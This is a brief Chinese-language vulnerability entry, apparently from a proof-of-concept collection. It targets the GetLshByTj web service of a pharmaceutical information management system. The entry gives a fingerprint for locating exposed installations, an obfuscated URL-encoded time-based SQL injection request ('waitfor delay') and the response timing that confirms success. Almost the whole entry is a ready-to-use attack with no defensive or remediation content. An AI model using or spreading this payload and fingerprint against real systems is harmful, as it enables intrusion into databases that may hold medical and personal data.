# 医药信息管理系统GetLshByTjSQL注入漏洞

医药信息管理系统GetLshByTj ｜ SQL注入 ｜ —
- **指纹**：`web.body="ResourceScripts/zh-cn-Login.aspx.js"`
- **请求**：`GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12`
- **响应特征**：200 响应时间>=4s